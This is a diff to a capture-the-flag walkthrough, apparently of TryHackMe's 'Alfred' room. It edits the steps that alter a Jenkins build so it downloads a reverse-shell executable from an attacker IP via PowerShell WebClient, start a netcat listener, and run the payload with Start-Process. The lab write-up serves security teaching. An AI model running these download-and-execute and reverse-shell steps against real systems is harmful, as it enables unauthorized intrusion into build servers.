@@ -88,10 +88,18 @@ Alter the configuration of the build to transfer the new payload.
 The command looks like: 
 `:> powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`
 
-`:> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.67.123.179:9000/robin.exe','robin.exe')"`
+`:> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.67.123.179:8000/robin.exe','robin.exe')"`
 
 ![Reconfigure](/assets/alfred-12.png)
+
+Restart listener to receive the incoming reverse shell: `:> nc -lvnp 8000`
 
 When the build runs, the file is transferred and can be found in the workspace.  
 
 ![Post-Build](/assets/alfred-13.png)
+
+![Post-Build 2](/assets/alfred-14.png)
+
+***Run the payload*** 
+
+`:> Start-Process robin.exe`
